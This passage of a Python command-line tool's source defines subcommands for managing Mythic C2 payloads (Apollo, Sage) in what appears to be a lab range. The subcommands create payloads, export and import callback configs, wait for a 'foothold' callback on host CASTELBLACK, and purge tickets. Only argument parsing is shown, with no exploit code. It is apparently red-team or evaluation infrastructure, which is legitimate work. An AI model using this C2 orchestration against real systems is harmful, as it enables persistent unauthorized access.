        default=env_bool("APOLLO_ADJUST_FILENAME"),
    )
    parser.add_argument(
        "--debug",
        action=argparse.BooleanOptionalAction,
        default=env_bool("APOLLO_DEBUG"),
    )
    parser.add_argument("--download-dir", default=os.environ.get("APOLLO_DOWNLOAD_DIR") or None)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="command", required=True)

    inspect_parser = sub.add_parser("inspect", help="Print Sage/Apollo payload schemas and current callbacks.")
    add_common(inspect_parser)
    inspect_parser.set_defaults(func=command_inspect)

    readiness_parser = sub.add_parser("readiness", help="Non-destructively check reset/callback readiness.")
    add_common(readiness_parser)
    readiness_parser.add_argument("--repo-root", default=str(REPO_ROOT))
    readiness_parser.add_argument(
        "--runtime-dbs-archived",
        "--operator-db-cleanup-confirmed",
        dest="runtime_dbs_archived",
        action="store_true",
        help=(
            "Use after sage.db and phoenix.db were archived before local Sage restarted. "
            "The old --operator-db-cleanup-confirmed spelling remains as a compatibility alias."
        ),
    )
    readiness_parser.add_argument(
        "--foothold-payload-type",
        default=os.environ.get("FOOTHOLD_PAYLOAD_TYPE", "apollo"),
        help="Payload type expected on CASTELBLACK as samwell.tarly (default: apollo).",
    )
    readiness_parser.set_defaults(func=command_readiness)

    export_parser = sub.add_parser(
        "export-callback-config",
        help="One-time export of a callback config for a baked range snapshot.",
    )
    add_common(export_parser)
    export_parser.add_argument(
        "--callback",
        required=True,
        help="Mythic callback display ID or agent_callback_id.",
    )
    export_parser.add_argument(
        "--output",
        default=os.environ.get("APOLLO_CALLBACK_CONFIG_PATH"),
        help=f"Output path (default: {DEFAULT_CALLBACK_CONFIG_PATH}).",
    )
    export_parser.set_defaults(func=command_export_callback_config)

    import_parser = sub.add_parser(
        "import-callback-config",
        help="Import a retained callback config into Mythic.",
    )
    add_common(import_parser)
    import_parser.add_argument(
        "--config",
        default=os.environ.get("APOLLO_CALLBACK_CONFIG_PATH"),
        help=f"Config path (default: {DEFAULT_CALLBACK_CONFIG_PATH}).",
    )
    import_parser.set_defaults(func=command_import_callback_config)

    sage_parser = sub.add_parser("create-sage", help="Create a fresh Sage payload/callback.")
    add_common(sage_parser)
    add_sage_args(sage_parser)
    sage_parser.set_defaults(func=command_create_sage)

    apollo_parser = sub.add_parser("create-apollo", help="Create a fresh Apollo HTTP payload.")
    add_common(apollo_parser)
    add_apollo_args(apollo_parser)
    apollo_parser.set_defaults(func=command_create_apollo)

    all_parser = sub.add_parser("create-all", help="Create fresh Sage and Apollo payloads.")
    add_common(all_parser)
    add_sage_args(all_parser)
    add_apollo_args(all_parser)
    all_parser.set_defaults(func=command_create_all)

    reset_parser = sub.add_parser(
        "bootstrap-reset",
        help="Create fresh Sage/Apollo payloads or explicitly import a retained foothold callback config.",
    )
    add_common(reset_parser)
    add_sage_args(reset_parser)
    add_apollo_args(reset_parser)
    reset_parser.add_argument(
        "--callback-config",
        default=os.environ.get("APOLLO_CALLBACK_CONFIG_PATH"),
        help=f"Legacy retained callback config path (default: {DEFAULT_CALLBACK_CONFIG_PATH}).",
    )
    reset_parser.add_argument(
        "--use-baked-apollo",
        action="store_true",
        default=env_bool("APOLLO_USE_BAKED_CALLBACK"),
        help=(
            "Legacy opt-in: import a retained baked Apollo callback config and wait for reconnect. "
            "The clean-baseline workflow creates a fresh Apollo payload instead."
        ),
    )
    reset_parser.add_argument(
        "--retained-callback-config",
        default=os.environ.get("RETAINED_CALLBACK_CONFIG_PATH"),
        help="Retained callback config path for --use-retained-callback.",
    )
    reset_parser.add_argument(
        "--use-retained-callback",
        action="store_true",
        default=env_bool("USE_RETAINED_CALLBACK"),
        help=(
            "Opt in to importing a retained foothold callback config instead of creating Apollo. "
            "The payload type is inferred from the exported config."
        ),
    )
    reset_parser.add_argument(
        "--post-callback-timeout",
        type=int,
        default=DEFAULT_POST_CALLBACK_TIMEOUT_SECONDS,
        help="Seconds to wait for the baked Apollo callback before failing.",
    )
    reset_parser.add_argument(
        "--max-clock-skew-seconds",
        type=float,
        default=DEFAULT_MAX_CLOCK_SKEW_SECONDS,
        help="Maximum accepted guest/controller clock skew after synchronization.",
    )
    reset_parser.set_defaults(func=command_bootstrap_reset)

    preflight_parser = sub.add_parser(
        "post-callback-preflight",
        help="Wait for live Samwell Apollo, synchronize clocks, purge tickets, and verify callback identity.",
    )
    add_common(preflight_parser)
    preflight_parser.add_argument(
        "--post-callback-timeout",
        type=int,
        default=DEFAULT_POST_CALLBACK_TIMEOUT_SECONDS,
        help="Seconds to wait for the Samwell Apollo callback before failing.",
    )
    preflight_parser.add_argument(
        "--max-clock-skew-seconds",
        type=float,
        default=DEFAULT_MAX_CLOCK_SKEW_SECONDS,
        help="Maximum accepted guest/controller clock skew after synchronization.",
    )
    preflight_parser.set_defaults(func=command_post_callback_preflight)

    return parser


def main() -> None:
    args = build_parser().parse_args()
    asyncio.run(args.func(args))


if __name__ == "__main__":
    main()
